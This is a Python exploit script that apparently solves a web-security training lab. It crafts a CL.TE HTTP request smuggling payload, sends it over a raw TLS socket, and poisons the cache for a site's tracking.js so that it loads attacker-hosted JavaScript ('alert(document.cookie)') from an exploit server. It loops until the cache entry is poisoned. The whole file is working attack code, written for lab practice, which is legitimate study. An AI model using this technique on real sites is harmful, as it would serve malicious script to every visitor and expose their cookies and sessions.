# Exploiting HTTP request smuggling to perform web cache poisoning

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import socket
import ssl

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def send_posts(s, url):
	for i in range(1, 6):
		r = s.post(url)

def store_payload(s, url, payload, attacker):
	store_exploit_path = attacker
	store_exploit_data = {
			"formAction": "STORE",
			"urlIsHttps": "on",
			"responseFile": "/post",
			"responseHead": """HTTP/1.1 200 OK
Content-Type: text/javascript; charset=utf-8""",
			"responseBody": payload
	}
	r = s.post(store_exploit_path, data=store_exploit_data)
	# time.sleep(1)
	print('\n[+] Targeted endpoint or query parameter:\n    %s' % url)
	print('\n[+] Using payload:\n%s' % payload)
	print('\n[+] Delivered to the victim via:\t%s' % store_exploit_path + store_exploit_data['responseFile'])
	return r

def build_request(url, attacker):
	request_body = '0\r\n'
	request_body += '\r\n'
	request_body += 'GET /post/next?postId=1 HTTP/1.1\r\n'
	request_body += 'Host: ' + attacker + '\r\n'
	request_body += 'Content-Type: application/x-www-form-urlencoded\r\n'
	request_body += 'Content-Length: 10\r\n'
	request_body += '\r\n'
	request_body += 'x=1'
	
	request_content = 'POST / HTTP/1.1\r\n'
	request_content += 'Host: ' + url + '\r\n'
	request_content += 'Content-Type: application/x-www-form-urlencoded\r\n'
	request_content += 'Content-Length: ' + str(len(request_body)) + '\r\n'
	request_content += 'Transfer-Encoding: chunked\r\n'
	request_content += '\r\n'
	request_content += request_body
	print("------------------------------------------------------")
	print(request_content)
	print("------------------------------------------------------")
	return request_content

def send_smuggling(request_content, host, port):
	context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
	context.check_hostname = False
	context.verify_mode = ssl.CERT_NONE
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock = context.wrap_socket(sock, server_hostname=host)
	sock.connect((host, port))
	sock.sendall(request_content.encode())
	resp = sock.recv(256)
	print(' '.join(resp.decode().split(None,3)[0:3]))
	resp_code = ' '.join(resp.decode().split(None,3)[0:3])
	if "302" in resp_code:
		print(resp)
	sock.close()
	return resp_code

def find_exploit_srv(r):
	if re.search(r"href='(.*)'>Go to exploit server", r.text):
		srv = re.search(r"href='(.*)'>Go to exploit server", r.text).group(1)
		print('[+] Found Exploit server:\n\t%s' % srv)
		return srv
	else:
		print("[-] Didn't find exploit server on the home page <!>")
		sys.exit(1)

def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Usage: %s https://example.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Exploiting HTTP request smuggling to perform web cache poisoning')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down (or proxy missconfigured) <!>')
			sys.exit(-1)
		else:
			print('\n\n[+] Trying to store the payload on the exploit server...')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			subdomain = parsed_url.netloc
			url = parsed_url.scheme + '://' + subdomain
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			exploit_srv = find_exploit_srv(r)
			attacker = urllib.parse.urlparse(exploit_srv).scheme + "://" + urllib.parse.urlparse(exploit_srv).netloc
			atk_url = urllib.parse.urlparse(attacker)
			atk_domain = atk_url.netloc
			if atk_url.port:
				atk_port = atk_url.port
			elif atk_url.scheme == "https":
				atk_port = 443
			elif atk_url.scheme == "http":
				atk_port = 80
			payload = "alert(document.cookie)"
			store_payload(s, subdomain, payload, f'{atk_url.scheme}://{atk_domain}')
			request_content = build_request(subdomain, atk_domain)
			solved = False
			counter = 0
			poisoned = False
			while solved is False:
				if counter > 0 and poisoned:
					r = s.get(url)
					if 'Congratulations, you solved the lab!' in r.text:
						print('\n[+] The lab is solved !')
						solved = True
						break
				print('[+] Trying send HTTP Request Smuggling attack...\n')
				r = send_smuggling(request_content, subdomain, port)
				print(r)
				counter += 1
				r = s.get(url + '/resources/js/tracking.js')
				print(r)
				if not r.headers.get('X-Cache') == 'miss':
					if r.headers.get('Age'):
						age = int(r.headers.get('Age'))
						time_left = 30 - age
						print('[+] Waiting %s seconds...' % time_left)
						time.sleep(time_left)
					else:
						time.sleep(5)
					continue
				r = s.get(url + '/resources/js/tracking.js')
				print(r)
				if r.headers.get('X-Cache') == 'hit':
					print('[+] Poisoned...')
					poisoned = True
					send_posts(s, url)
					time.sleep(4)
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
